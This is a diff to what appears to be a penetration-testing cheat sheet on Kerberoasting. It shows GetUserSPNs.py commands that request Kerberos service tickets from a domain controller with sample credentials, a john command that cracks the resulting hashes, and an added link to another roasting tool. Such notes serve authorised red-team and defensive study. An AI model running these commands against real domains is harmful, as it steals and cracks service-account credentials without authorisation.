@@ -44,6 +44,8 @@ Using GetUserSPN.py:
 `python3 GetUserSPNs.py domain.local/user1:p@ssw0rd -dc-ip 192.168.1.11 -request-user targetserviceuser`   
 Kerberoast all SPNs (NOT OPSEC!!!):   
 `proxychains GetUserSPNs.py windomain.local/user:Password123 -dc-ip 192.168.1.12 -request`   
+Another tool:   
+ - https://github.com/ShutdownRepo/targetedKerberoast   
 
 ### Cracking
 `john --format=krb5tgs --wordlist=wordlist svc_mssql`   
